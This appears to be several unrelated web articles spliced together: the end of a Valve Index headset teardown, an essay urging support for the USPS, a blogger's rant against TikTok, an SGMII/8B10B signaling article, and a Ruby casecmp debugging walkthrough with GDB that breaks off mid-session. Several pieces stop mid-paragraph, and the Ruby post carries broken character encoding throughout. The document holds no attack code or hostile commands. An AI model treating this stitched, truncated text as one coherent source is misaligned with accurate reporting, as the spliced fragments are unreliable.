<p>Next step is to remove the main circuit board and look on its other side. Other side is less interesting and has very little information to offer. Most parts are related to the power regulation mentioned in the previous paragraph.</p>

<p><img src="https://www.thevrist.com/assets/images/index14.jpg" alt="">
<em>Back side of the main circuit board</em></p>

<p>Largest chip is an Atmel MCU, which I’ve already mentioned is related to the tracking system. On the left from it is a <a href="https://www.nxp.com/docs/en/data-sheet/LPC11U1X.pdf">microcontroller from NXP</a>. These are all the chips we managed to identify. One chip that is missing, is the additional Bluetooth module. Unlike Vive and Vive Pro, Index has bluetooth in the headset. It is used for connecting to the base stations, updating base station firmware, and sending them to sleep mode when the headset is turning off. Last one is completely optional - I prefer to keep my base stations 2.0 on all the time.</p>

<p><img src="https://www.thevrist.com/assets/images/index14-2.jpg" alt="">
<em>The only two chips worth noting on this side of the motherboard - larger one is for tracking calculations</em></p>

<p>Why there is no separate Bluetooth chip for this purpose is still a mystery for me. Only possible explanation is that two Bluetooth chips for controllers are capable of switching to different modes and control the base stations.</p>

<h2 id="screens">Screens</h2>

<p>After the circuit is removed you will reveal several key components. First - you can see two displays - quick search shows that those panels are made by BOE Technology - Chinese display manufacturer. Those are 1440×1600, 615PPI 3.5” <a href="https://www.panelook.com/VS035ZSM-NW0-69P0_BOE_3.5_LCM_overview_37926.html">panels</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index15.jpg" alt="">
<em>View of the HMD with main board removed</em></p>

<p>Note some key elements in this view. On the bottom there is a circular mechanism with a metal pin with springs going through the whole headset. Similar pin is barely visible on the top of the headset. This is an IPD adjustment system - movement of the knob at the bottom of the HMD will rotate circular element in the bottom center which will push screens apart.
On the left and right sides of HMD you can see black gears - this is a system for eye relief - rotating a knob on the side of the headset will move the facemask relatively to the screens. Gear system is making sure both sides are rotating simultaneously, without giving too much pressure to the mechanism.</p>

<p><img src="https://www.thevrist.com/assets/images/index16.jpg" alt="">
<em>IPD knob is actually a screw</em></p>

<p>In order to take the central part out from the headset, you will need to take the cap off the IPD adjustment knob and unscrew it.</p>

<p><img src="https://www.thevrist.com/assets/images/index17.jpg" alt="">
<em>Lens chambers with IPD mechanism still attached</em></p>

<p>Next was what I call the “wondering in the dark” part of teardown - for about 30 minutes we were trying to find a way of taking it apart without breaking anything, eventually using force to break one gear inside that was holding display chambers in place.</p>

<p><img src="https://www.thevrist.com/assets/images/index18.jpg" alt="">
<em>Right eye lens chamber removed</em></p>

<p>After this step you can easily take off separate lens chambers and view the details. Chambers are sealed shut so nothing will get inside - they are assembled in perfectly clean conditions with no dust particles. 
In order to take it apart you can probably try to melt glue or something like that. But we are no iFixit, we used good ol’ force. Here you can see the screen separated from the chamber.</p>

<p><img src="https://www.thevrist.com/assets/images/index19.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index20.jpg" alt="">
<em>BOE screen removed from the chamber</em></p>

<p>Screen has a polarised diffuser glued to it, which is particularly difficult to remove. It is made of very thin crystal glass and it cracks easily. You can see that the corners of it are cracked.</p>

<p><img src="https://www.thevrist.com/assets/images/index21.jpg" alt="">
<em>Crystal polarisation diffuser</em></p>

<p>Diffuser is added to blend pixels better, making the screen door effect even lower.</p>

<p><img src="https://www.thevrist.com/assets/images/index22.jpg" alt="">
<em>Fancy multilayered lens</em></p>

<p>Finally - the lenses. I was expecting them to be thicker with the effect that they create. Valve are saying “The custom lenses built into the Valve Index Headset maximize field of view without sacrificing edge-to-edge clarity. High geometric stability allows you to look around the scene by moving your eyes (not just your head) with minimal shape distortion”. I tend to agree that these are the most advanced lenses in modern mass produced HMD, even though they have their own flaws. Main issue is the light spill when using a headset, you can see the bright light’s reflections in spots where they shouldn’t be.</p>

<h2 id="final-thoughts">Final thoughts</h2>

<p>As you can clearly see, it is not possible to replace a damaged screen or scratched lens all by yourself (even though for latter one you might try to take the lens out using a suction cup, however I don’t think that is a good idea, as lenses and screens are calibrated in the factory).</p>

<p><img src="https://www.thevrist.com/assets/images/index-end.jpg" alt="">
<em>Sometimes… I feel like a monster…</em></p>

<p>I am going to put the high-resolution images of the teardown and of the motherboard <a href="https://photos.app.goo.gl/dhuPVWTu6P5XWo4HA">here</a> so you can see and check all the details by yourself.

<p>There are three types of infrastructure. One is visible: roads, dams and bridges. The second is invisible: broadband internet provisions and the entirety of our cellular infrastructure. Both are still vital in building our present. The third form of infrastructure is one being rebuilt in order to be repurposed for future use. I explained in <em>J-Curves and Agglomeration</em>:</p>
<blockquote><p>The U.S. Postal Service is a key component of the eCommerce economy. Packages are just 5% of its shipping volume but eCommerce accounts for nearly 30% of the agency’s revenue. Partnerships with vendors like Amazon (or providers like FedEx and UPS) provide a majority of its package volume but small businesses and direct-to-consumer brands rely on USPS’ pricing. Raising costs on retailers may lead to more attrition. […]</p>
<p>By raising prices to combat Amazon’s growing influence over the economy, disrupting the postal economy is no different than digging up paved roads before a period of heightened freight transit. [<a href="https://2pml.com/2020/05/18/agglomeration/">2PM, 1</a>]</p></blockquote>
<p>The U.S. Postal Service is all three. When an American institution is 250 years old, it may as well be the ground that we stand on. The service has contributed services and innovations that we don’t readily attribute to it. Consider its contribution to the middle class: the U.S. Postal Service is one the country’s biggest employers with nearly 330,000 career employees and an average salary of $50,000. They are building the future of eCommerce, a still-nascent industry.</p>
<p>Critics of the USPS will cite cost of labor as a reason for the service’s obsolescence. A common refrain is “Why couldn’t Amazon takeover the service?” Consider that in the fourth quarter of 2019, eCommerce was just 11.9% of all retail. Amazon constituted right under half of that volume. And without the postal service, Amazon would not exist. The market costs of shipment subsidized a number of Amazon’s operations, allowing it to capture market share.</p>
<h2>“The Ground We Stand On”</h2>
<p>The postal service began before the founding of the United States. Benjamin Franklin was fired from his role as postmaster due to his involvement with the American Revolution. Just one year later in 1775, the Continental Congress appointed Franklin the Postmaster General of the “United Colonies.” His tenure left a mail system that offered service between the then-colonies and Great Britain. By 1802, the first African-Americans to work for the Postal Service were enslaved mail carriers. Senator James Jackson of Georgia, Chairman of the Committee of the Senate on the Post Office Establishment, once wrote:</p>
<blockquote><p>… The most active and intelligent [slaves] are employed as post riders. By travelling from day to day, and hourly mixing with people […] they will acquire information. They will learn that a man’s rights do not depend on his color. They will, in time, become teachers to their brethren.</p></blockquote>
<p>Within two months of Senator Jackson’s proclamation, African-Americans would be banned from the postal service, lasting from 1802 to March 1865, just one month before the conclusion of the Civil War. This disbarment ended by congressional decree.</p>
<blockquote><p>No person, by reason of color, shall be disqualified from employment in carrying the mails. (13 Stat. 515)</p></blockquote>
<p>The next decades would see an unparalleled push for African-American financial stability. Nearly 800 would serve as postal employees prior to the 20th century. More than 200 African Americans are known to have served in the high rank of postmaster prior to the conclusion of Reconstruction and the Progressive Era (1863-1920). Of them, nearly 20 were women. The postal service has always been politicized.</p>
<p>Soon after, the U.S. Government expanded on the postal service’s role in democratizing America, both literally and figuratively. President Theodore “Teddy” Roosevelt expanded on this with the <em>Square Deal</em> in 1902, communicating a fairness policy in hiring and leadership. The result was momentous for many. Roosevelt stated:</p>
<blockquote>
<p>It is and should be my consistent policy in every State, where their numbers warranted it, to recognize colored men of good repute and standing in making appointments to office. […] I can not consent to take the position that the door of hope – the door of opportunity – is to be shut upon any man, no matter how worthy, purely upon the grounds of race or color. <a href="https://about.usps.com/who-we-are/postal-history/african-american-workers-20thc.htm#_edn2" name="_ednref2">[2]</a></p>
</blockquote>
<p>Today, 21% (or nearly 70,000) of the agency’s employees are African-American. However, the postal service was consequential beyond matters of social equity. By 1823, the U.S. Postal Service and the U.S. Government established 80,000 miles of “post roads” to help carriers navigate new rural areas. By 1860, these roads connected nearly 28,000 post offices. Today, the postal service maintains nearly 40,000 post offices, clearing 212 billion letters and mail to 144 million homes.</p>
<blockquote data-card-controls="1" data-card-align="center" data-card-theme="light" data-card-key="3101080c845e4679b6077080f81a573e">

<p>Save the @USPS.There is no institution more critical to the next phases of our commerce economy.</p>
</blockquote>

<p>Today, the service is tasked with another generational shift: supporting online retail. The pandemic shifted the American consumer towards online retail, this while reducing the number of units shipped. As such, companies like UPS and FedEx have responded by hiking prices. In response to USPS’ distress, FedEx recently stated:</p>
<blockquote>
<p>The COVID-19 pandemic has negatively impacted mail volumes and mix resulting in a further decrease in revenues and negative financial impact for the USPS. Additionally, the USPS continues to experience budgetary uncertainty as well as increased political debate regarding potential privatization or restructuring of its operations.</p>

<p>Cost inflation is the most concerning obstacle ahead for digitally native retailers. Without the treatment that the United States’ oldest civilian service afforded Amazon in its infancy, it will be more difficult to build more businesses of Amazon’s scale. The economics were difficult enough as is; these added costs will only add pressure to pass along costs to consumers, many of whom are facing down one of the most economically vulnerable periods since 2008.We should consider the postal service an investment into our present and future and a monument to our past.</p>
<p>If our economy is to begin addressing the shortfalls caused by the overwhelming contraction in the traditional retail industry, it will need the support of the postal service. For eCommerce, their service is the industry’s last mile for thousands of direct-to-consumer small businesses. The postal service uniquely sits at the intersection of our physical roads and our digital infrastructure. There isn’t a direct substitute and we shouldn’t wait to find out the hard way. Save the USPS. We will need more companies like the the successful hundreds that were built on its 250 year old infrastructure. That includes Amazon.</p>

Trump doesn’t like TikTok. He doesn’t like Tik-Tok because of the Chinese. Apparently, they use it for espionage. That’s why he wants the app banned in the United States. He also wants to ban the WeChat app. He has already issued a decree to do this. (<a href="https://www.tagesschau.de/ausland/trump-tik-tok-verfuegung-101.html" target="_blank" rel="noopener noreferrer">1</a>, <a href="https://www.heise.de/news/Analyst-Trump-Verfuegung-gegen-WeChat-schaedigt-iPhone-Geschaeft-4866876.html" target="_blank" rel="noopener noreferrer">2</a>)</p><p>TikTok is a video app. Entertainment on the go. WeChat is an app for communication and even with payment function. Mainly used in China.</p><p>I am over 40 years young. I had already heard TikTok. But I have never used it. I do not have the time for that. A few days ago, a visitor came to see my daughter. The girl had TikTok on her smartphone. She explained the app to me and I observed how it was used.</p><p>I had made a judgement very quickly. I have to test TikTok. Installed on my test phone and started. At the beginning you choose a few categories to get started. I chose humorous, learning and society. The consumption of videos should finally bring me some value. The good thing is that everyone of you can test the app that way. A registration beyond this level is not necessary for the consumption. Only those who want more would have to open an account.</p><p>I had planned to test TikTok for two hours. It should already be one movie length to make a judgement. If my daughter’s classmates use this app, she will sooner or later come across TikTok as well.</p><p>I have given myself the additional task of keeping a tally sheet. I wanted to know how many videos I watch in the two hours and how many videos I have to laugh or take something positive with me. It is not about casual laughter when there is a small funny scene, but hearty, beautiful laughter. Knowledge must trigger an eye-opening effect.</p><p>And so it began … and I was there for 24 minutes. After that I was completely exhausted.</p><p>I consumed 74 videos. I laughed once.</p><p>TikTok is continuous bombardment with short videos. The <a href="https://en.wikipedia.org/wiki/Katyusha_rocket_launcher" target="_blank" rel="noopener noreferrer">Stalin organ</a> of entertainment. You can really feel how big parts of your own brain explode and are useless afterwards.</p><p>TikTok is the cruelest app, the worst entertainment I have ever experienced. I have seen different actors performing the same sketch. I’ve seen German stars in bad performances. I’ve seen people acting as if they already have no brain at all. I’ve seen young people acting as if they were the children of adults who have no brains. It was a culture shock.</p><p>I can’t explain how bad, how underground, how primitive the content if TikTok is. Respect for every TikTok entertainer who produces trash every day and finds fans who give him presents for it. I don’t know if it should be the goal of life to produce trash, but 24 minutes showed me that nuclear waste is less toxic than the contents on TikTok.</p><p>TikTok does not exist in our household. The domains are blocked in the router. It is completely irresponsible to let underaged people use this app. At Apple and in the Google Play Store the app is listed from 12 years of age. And just like my daughter, however, the visitor was younger than 12 years. And according to her, many of her classmates use this app. Do parents buy their children smartphones to turn them into zombies on purpose? Terrifying. TikTok is proof that parents who don’t monitor their children’s online use must be severely punished.</p><p>TikTok should not be banned for fear of Chinese espionage. TikTok should be banned for being stupid on a massive scale. A realistic classification would be from the age of 18. Then it would be ensured that ex-minors can only go through this garbage dump of do-it-yourself entertainment when it can be assumed that they have developed a few brain cells.</p><p>If you have never tested TikTok, but there are people in the household who consume the contents, then inform yourself. Be prepared, however, that you will start to doubt the viability of some TikTokers and especially the users. And if not, I wish you a happy life, but please never go to a democratic election.</p><p>TikTok? Never!</p> <p><span>Tagged <a href="https://kowabit.de/tag/app/" rel="tag">App</a>, <a href="https://kowabit.de/tag/diy/" rel="tag">diy</a>, <a href="https://kowabit.de/tag/entertainment/" rel="tag">entertainment</a>, <a href="https://kowabit.de/tag/minors/" rel="tag">minors</a>, <a href="https://kowabit.de/tag/smartphone/" rel="tag">Smartphone</a>, <a href="https://kowabit.de/tag/tiktok/" rel="tag">tiktok</a></span></p></div></div></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
		

<h2>Overview</h2>
<p>
	This article reviews various SGMII (&amp; 1000BASE-SX) concepts that
	are integral to our <a href="https://mindchasers.com/privateisland">Private Island™</a> project
	and its current soft Verilog <a href="https://mindchasers.com/repos/cgit.cgi/privateisland/tree/source/mac.v" target="_blank">MAC layer</a>. We provide oscilloscope screen shots
	below from our Rohde &amp; Schwarz RTO to help illustrate the concepts.
</p>

<p>
	As shown in the block diagram below, Private Island utilizes a Lattice
	Semiconductor <a href="https://mindchasers.com/dev/pi-lattice-ecp5" target="_blank">ECP5UM</a> FPGA<sup><a href="#note1">1</a></sup> to
	interface SGMII Gigabit Ethernet PHYS and other SERDES 8B10B
	peripherals. Unlike a typical SoC, the FPGA is capable of asserting an
	external interrupt synchronous to specific packet transmit or receive
	events. The interrupt can also assert on specific octets / special
	codes within the Ethernet frame (i.e., end of packet). This interrupt
	flexibility is important for certain security functions and provides a
	reliable and predictable way to trigger our scope during debug of the
	SGMII / SERDES bus for both hardware and software debug.
</p>

<p>For the oscilloscope screen shots provided in this article, the
	FPGA is configured as a transparent bridge between an Ethernet switch
	and an embedded Linux node. Certain received Ethernet frames from the
	LAN are mirrored onto a TAP port with the simultaneous assertion of an
	interrupt line. Oscilloscope probes are applied to the interrupt line
	and the SGMII TAP port.</p>

<p>
	The tap port can be realized today with <a href="https://mindchasers.com/dev/darsena-hw-spec" target="_blank">Darsena</a> using a third Ethernet port provided by our
	<a href="https://mindchasers.com/dev/hw-gige-shield" target="_blank">Gigabit Ethernet
		shield</a> or using our <a href="https://mindchasers.com/dev/hw-high-speed-shield" target="_blank">SMA
		shield</a>. In the former case, a differential probe is placed across a
	pair of AC coupling caps. In the latter case, SMA to BNC cables are
	used to directly connect to the oscilloscope. Note that we're also in the process
	of developing a Gigabit optical transceiver shield to support
	1000BASE-SX.

<h2>Brief overview of popular PHY Interfaces</h2>

<ul>

	<li>GMII, which is specified by IEEE 802.3-2015 defines a separate
		8-bit bus for transmit and receive data plus several signals to convey
		additional information between the MAC and PHY. GMII is based on MII,
		which is defined in Clause 22. In addition to the data buses and
		control signals, GMII requires two 125 MHz bit clocks: GTX_CLK and
		RX_CLK</li>
	<li>RGMII, which was defined by HP, Broadcom, and Marvell, reduces
		the pin count primarily by utilizing separate 4-bit buses for transmit
		and receive and both edges of the bit clocks (double data rate).</li>
	<li>SGMII, which was defined by Cisco, utilizes two pairs of
		SERDES / LVDS differential buses to carry transmit and receive data at
		1.25 Gbps. Differential clocks are defined but are optional and
		typically not used. Instead, the clocks are recovered from the data on
		the differential pairs. The data is encoded using an 8B/10B coding
		scheme, which is specified in clause 36 of 802.3-2015. The effective
		bit rate is 8 / 10 * 1.25 Gbps = 1.0 Gbps, as you would expect. The
		out-of-band information conveyed by the GMII control signals (TX_EN,
		TX_ER, RX_ER, and RX_DV) are replaced by special code groups (K
		values). This enables conveying information such as configuration,
		line state, and carrier events between the MAC and PHY.</li>
</ul>

	<line x1="0" y1="0" x2="2000" y2="0"></line>

<h2>SGMII Hardware Signaling</h2>

<p>
	The SGMII specification provides its own definition of LVDS, which is
	derived from <a href="http://standards.ieee.org/findstds/standard/1596.3-1996.html" target="_blank">IEEE 1596.3-1996</a>. However, the parameters provided
	in the SGMII specification are defined in the IEEE specification. For
	the purpose of SGMII hardware signaling, these two specifications are
	sufficient. PHY vendors often refer to this specification rather than
	providing their own numbers. Note that LVDS in general is an industry
	standard, and is defined in EIA/TIA-644A. A great resource for LVDS and
	differential signaling is the <a href="http://www.ti.com/litv/pdf/snla187" target="_blank">TI /
		National LVDS Owners Manual</a>.
</p>

<p>The figure below provides a very simple schematic of LVDS
	signaling. The concept being conveyed is that the transmitter drives a
	small current across a 100 ohm load in the receiver in one of two
	directions to produce either a positive or negative voltage across the
	receiver (Vod). This small current is superimposed over a common
	voltage (Vos), typically 1.2V. The industry standard LVDS specifies a
	3.5 mA driver current. The SGMII specification implies it is less since
	|Vod| max is 400 mV. In practice, most SGMII drivers (e.g., PHYs)
	support the configuration of multiple drive levels.</p>

<p>The next figure shows an oscilloscope screen shot of an SGMII bus
	using a 4.5 GHz differential probe (RT-ZD40). The probe tips are placed
	on the two AC coupling caps of the differential SGMII bus. The yellow
	signal is the SGMII signal, and the blue square wave is generated from
	the scope's HW CDR math function. A probe meter function is shown in
	the lower right. This is a feature / function of the probe and shows

<h2>A Look at SGMII Special Code Groups</h2>

<p>Clause 36 of 802.3-2015 defines certain 10-bit values as K values
	to convey non-data (out of band) information between the MAC and PHY.
	These K values take the place of the GMII control signals and special
	encodings of the GMII data bus. For Example, /K27.7/ defines a start of
	packet on the SGMII bus.</p>

<p>Referring to 802.3 Table 36-2 (valid special code-groups) and the
	screen shot below, we can see that K27.7 is defined as the bit sequence
	001001 0111 ([a..j] with 'a' transmitted first). This screen shot was
	taken using two single ended SMA cables (see figure below) and utilizes
	the 8B/10B protocol decode function equipped with our RTO. Note that
	that when the orange waveform is positive, the signal is a 1 and when
	the blue waveform is positive the signal is a 0.</p>

<p>The '+' after K27.7 indicates that the 10-bit waveform has a
	currently positive running disparity. Each code, both special and data,
	can either have a current positive or negative running disparity, and
	this indicates the difference of the total number of 1's and 0's on the
	wire. Refer to 802.3 clause 36.2 and Annex 36B for the details on
	running disparity and its rules.</p>

<h3>Ordered Sets</h3>

<p>802.3 defines ordered sets (Table 36-3) that consist of one or
	more code groups, each of which starts with a special code group (K
	value). For example, /I2/ specifies the IDLE2 line state and is encoded
	by /K28.5/D16.2/. This waveform continually repeats while the line
	remains in a powered up idle state, and is shown in the figure below.</p>

<ul>
	<li>K28.5-: 001111 1010
	</li><li>D16.2+: 100100 0101
</li></ul>

<h2>Data and Packets on an SGMII Bus</h2>

<p>The next figure shows a captured packet preamble on an SGMII bus.
	Per 802.3 35.2.3.2.1 and 36.2.4.14, An /S/ code (start of packet
	delimiter, K27.7) replaces the first octet of the preamble followed by
	the remaining PREAMBLE/SFD sequence: 0x55 0x55 0x55 0x55 0x55 0x55
	0xD5.</p>

<p>Note in the figure below that the special code groups (K) are
	shown in blue and the data code groups (D) are shown in yellow.</p>

<p>
	Our last scope screen shot shows a complete packet captured. The FPGA's
	interrupt line is used to trigger the scope synchronously with the
	reception of the packet on the TAP port. The scope trace highlights the
	functionality of the 8B/10B protocol decode feature, showing the full
	decode results in a table and a search result box looking for the K27.7
	special code group, which appears on the SGMII bus 60.46 ns after the
	interrupt. <em>This certainly gives new meaning to the term packet
		inspection.</em>

<h3>1000Base-SX</h3>

<p>It's important to note that SGMII is derived from 1000BASE-SX,
	which is defined in 802.3 Section 3. 1000BASE-SX is a specification for
	Ethernet over Fiber, and it utilizes 8B/10B coding for out of band
	signaling.</p>

<p>Note that we are currently developing an SFP Shield to support
	optical transceivers for 1000BASE-SX.</p>

<p>
	The figure below shows Darsnea in series with a low cost <a href="https://www.amazon.com/gp/product/B074WS6J3M/ref=as_li_ss_tl?ie=UTF8&amp;psc=1&amp;linkCode=ll1&amp;tag=mindchasers08-20&amp;linkId=1f9e1f051056ca92fe1a503b0eeae9dd&amp;language=en_US" target="_blank">Optical Media Adapter</a>. The great thing about this
	particular media adapter is that it has AC coupling caps on the PCB
	(even though they're not required). Therefore, we can use our diff
	probe to monitor both the transmit and receive data between the optical
	transceiver and the adapter's ASIC/SoC. If you're in the market for a
	low cost optical-to-electrical converter, this might be a good choice.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <p><img src="https://images.unsplash.com/photo-1522776851755-3914469f0ca2?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1000&amp;h=500&amp;q=80"></p>

<p>I noticed something odd today while working on two different Ruby codebases. This simple line of Ruby behaved differently in both applications:</p>

<div><div><pre><code><span>"luck"</span><span>.</span><span>casecmp</span><span>(</span><span>"L`auguste"</span><span>)</span>
</code></pre></div></div>

<p>Executing <code>"luck".casecmp("L`auguste")</code> in application A returned <code>-1</code>, while executing it in application B returned <code>1</code>.</p>

<p>â€œDid the alphabet change at some point and I didnâ€™t get the memo?â€�, I thought.</p>

<blockquote>
  <p><strong>Aside</strong></p>

  <p><a href="https://ruby-doc.org/core-2.7.1/String.html#method-i-casecmp"><code>String#casecmp</code></a> is a built-in Ruby method that returns <code>-1</code>, <code>0</code>, <code>1</code>, or <code>nil</code> depending on whether the object on which itâ€™s called is less than, equal to, or greater than the function argument, and it does so in case-insensitive fashion. Here are a few simple examples of how it behaves:</p>

  <div><div><pre><code><span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcde"</span><span>)</span>     <span>#=&gt; 1</span>
<span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcdef"</span><span>)</span>    <span>#=&gt; 0</span>
<span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcdefg"</span><span>)</span>   <span>#=&gt; -1</span>
<span>"abcdef"</span><span>.</span><span>casecmp</span><span>(</span><span>"ABCDEF"</span><span>)</span>    <span>#=&gt; 0</span>
</code></pre></div>  </div>
</blockquote>

<h2 id="looking-for-monkey-patches">Looking for monkey patches</h2>

<p>Seeing as one of the applications is built on top of Ruby of Rails and the other isnâ€™t, my first thought was that maybe there was a Rails and/or ActiveSupport patch on <code>String#casecmp</code> that would change the behavior of this line in one of the applications. However, I didnâ€™t find anything that pointed to this. I kept digging, hoping to maybe find a patch in the <em>other</em> application that could explain this difference in behavior. Again, I didnâ€™t find anything. ðŸ™ˆ</p>

<h2 id="different-rubies">Different Rubies</h2>

<p>Eventually, after exploring a bit more, I realized that both applications ran on different versions of Ruby: application A was on Ruby 2.6, while application B was using Ruby 2.7.</p>

<p>Running the same command on both versions of Ruby indeed gives us different results:</p>

<div><div><pre><code><span>$ </span>~/.rubies/ruby-2.6.6/bin/ruby <span>-e</span> <span>'puts "luck".casecmp("L`Auguste")'</span>
<span>-1</span>

<span>$ </span>~/.rubies/ruby-2.7.0/bin/ruby <span>-e</span> <span>'puts "luck".casecmp("L`Auguste")'</span>
1
</code></pre></div></div>

<p>Ah ha! Weâ€™re getting closer. While I could have called it a day here and simply updated application B to Ruby 2.7 to resolve the issue, I wanted to understand: what causes it?</p>

<h2 id="changelogs--bindingpry">Changelogs &amp; <code>binding.pry</code></h2>

<p>I then started to comb through Ruby changelogs, trying to find if anything changed between Ruby 2.6 and Ruby 2.7 for <code>String#casecmp</code>, or anything somehow related to string comparison. I didnâ€™t find anything.</p>

<p>Of course, it would be nice to debug this using <code>binding.pry</code> or other similar Ruby-level debugging tools by stepping into the <code>String#casecmp</code> call to see whatâ€™s going on inside. However, this doesnâ€™t get us very far, as trying to use Rubyâ€™s <code>Tracer</code> or <code>binding.pry</code> doesnâ€™t really help.</p>

<p>Running this:</p>

<div><div><pre><code><span>$ </span>ruby <span>-r</span> tracer <span>-e</span> <span>'"luck".casecmp("L`Auguste")'</span>
</code></pre></div></div>

<p>â€¦ returns this output:</p>

<div><div><pre><code>#0:-e:1::-: "luck".casecmp("L`Auguste")
</code></pre></div></div>

<p>â€¦ and not much else. Thatâ€™s because <code>String#casecmp</code> is implemented in C, directly inside MRIâ€™s <a href="https://github.com/ruby/ruby/blob/master/string.c"><code>string.c</code></a>, so thereâ€™s no actual Ruby code underneath <code>String#casecmp</code> that we can step into using Ruby-level debugging tools.</p>

<p>Here comes the GDB part: because weâ€™re essentially dealing with C code at this point, we can use GDB to understand what happens inside the call to <code>String#casecmp</code>. So with that, I fired up GDB for the first time in years (I typically work with Ruby, so GDB is not something I commonly use).</p>

<h2 id="identifying-the-root-cause-using-gdb">Identifying the root cause using GDB</h2>

<p>Letâ€™s see how to use GDB to understand why both Ruby 2.6 and Ruby 2.7 behave differently with the same input to <code>String#casecmp</code>.</p>

<p>I first prepared a simple Ruby file containing the source that replicates the issue:</p>

<div><div><pre><code><span># ~/casecmp.rb</span>
<span>puts</span> <span>"luck"</span><span>.</span><span>casecmp</span><span>(</span><span>"L`Auguste"</span><span>)</span>
</code></pre></div></div>

<p>Notice that the second character in the input to <code>casecmp</code> is a backtick (<code>`</code>), which has ASCII code 96. This is relevant for paragraphs below.</p>

<h3 id="in-ruby-270">In Ruby 2.7.0</h3>

<p>Letâ€™s start by firing up GDB with a self-compiled version of Ruby 2.7.0:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>gdb /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby
Reading symbols from /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby...
</code></pre></div></div>

<p>Then, we add a breakpoint on the <code>str_casecmp</code> function so execution pauses once we reach it:</p>

<div><div><pre><code>(gdb) break str_casecmp
Breakpoint 1 at 0x1001fa766: file string.c, line 3371.
</code></pre></div></div>

<p>Perfect. Weâ€™re now ready to run the <code>casecmp.rb</code> Ruby script from above.</p>

<div><div><pre><code>(gdb) run casecmp.rb
Starting program: /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby casecmp.rb
</code></pre></div></div>

<p>We eventually hit the breakpoint we just set:</p>

<div><div><pre><code>Thread 2 hit Breakpoint 1, str_casecmp (str1=4329352680, str2=4329352640) at string.c:3371
3371	    enc = rb_enc_compatible(str1, str2);
</code></pre></div></div>

<blockquote>
  <p><strong>Aside</strong></p>

  <p>Internally, <a href="https://github.com/ruby/ruby/blob/4318aba9c94ebff53e4168886e1a35a24013924f/string.c#L3467-L3468"><code>String#str_casecmp</code></a> is quite simple: it iterates over each character in both inputs by index starting from the first character, converting both characters to the same case so that the function behaves in a case-insensitive way, and returns early if the two currently considered characters from each input are different. In doing so, it determines which character is â€œbiggerâ€� than the other using the character code (an <a href="http://www.asciitable.com/">ASCII code table</a> is a useful asset to have nearby for the rest of this blog post).</p>
</blockquote>

<p>In Ruby 2.7.0, notice that the case conversion <a href="https://github.com/ruby/ruby/blob/e9e4f8430a62f56a4e62dd728f4498ee4c300c12/string.c#L3381-L3382">converts both inputs to lowercase using <code>TOLOWER</code></a>:</p>

<div><div><pre><code><span>while</span> <span>(</span><span>p1</span> <span>&lt;</span> <span>p1end</span> <span>&amp;&amp;</span> <span>p2</span> <span>&lt;</span> <span>p2end</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>*</span><span>p1</span> <span>!=</span> <span>*</span><span>p2</span><span>)</span> <span>{</span>
    <span>unsigned</span> <span>int</span> <span>c1</span> <span>=</span> <span>TOLOWER</span><span>(</span><span>*</span><span>p1</span> <span>&amp;</span> <span>0xff</span><span>);</span>
    <span>unsigned</span> <span>int</span> <span>c2</span> <span>=</span> <span>TOLOWER</span><span>(</span><span>*</span><span>p2</span> <span>&amp;</span> <span>0xff</span><span>);</span>
    <span>if</span> <span>(</span><span>c1</span> <span>!=</span> <span>c2</span><span>)</span>
      <span>return</span> <span>INT2FIX</span><span>(</span><span>c1</span> <span>&lt;</span> <span>c2</span> <span>?</span> <span>-</span><span>1</span> <span>:</span> <span>1</span><span>);</span>
  <span>}</span>
  <span>p1</span><span>++</span><span>;</span>
  <span>p2</span><span>++</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>After navigating in <code>str_casecmp</code> using <code>next</code> a few times, we enter the loop and arrive at a point where we can print <code>c1</code> and <code>c2</code>, which are the codes for the characters at the current index for both inputs:</p>

<div><div><pre><code>3382	                unsigned int c2 = TOLOWER(*p2 &amp; 0xff);
(gdb) print c1
$11 = 108
(gdb) next
3383	                if (c1 != c2)
(gdb) print c2
$12 = 108
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>c1
 â†“
108  ?   ?   ?
 l   u   c   k

108  ?   ?   ?   ?   ?   ?   ?   ?
 l   `   a   u   g   u   s   t   e
 â†‘
c2
</code></pre></div></div>

<p>108 is the decimal ASCII character code representation for the first letter of both inputs: <code>l</code> (lowercase â€œLâ€�), so the loop continues to the next iteration because <code>c1</code> and <code>c2</code> are the same.</p>

<p>On the second iteration of the loop (on the second character of both inputs), we get the following results:</p>

<div><div><pre><code>3382	                unsigned int c2 = TOLOWER(*p2 &amp; 0xff);
(gdb) print c1
$14 = 117
(gdb) next
3383	                if (c1 != c2)
(gdb) print c2
$16 = 96
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>    c1
     â†“

 l   `   a   u   g   u   s   t   e
     â†‘
     c2
</code></pre></div></div>

<p><code>c1</code> contains <code>117</code>, which is the decimal ASCII character code representation for <code>u</code>, while <code>96</code> (in <code>c2</code>) is the character code for a backtick (<code>`</code>). We then enter the <code>if (c1 != c2)</code> conditional, and the return value is <code>1</code> because <code>c1 &gt; c2</code> (<code>117 &gt; 96</code>).</p>

<p>Okay. So far so good. This lines up with the initial observation of the issue. How are things different in Ruby 2.6.6?</p>

<h3 id="in-ruby-266">In Ruby 2.6.6</h3>

<p>We do almost the same setup as above (same one-line Ruby script to replicate the issue, same breakpoint on <code>str_casecmp</code>), but we fire up GDB with Ruby 2.6.6:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>gdb /Users/maximevaillancourt/.rubies/ruby-2.6.6/bin/ruby

</code></pre></div></div>

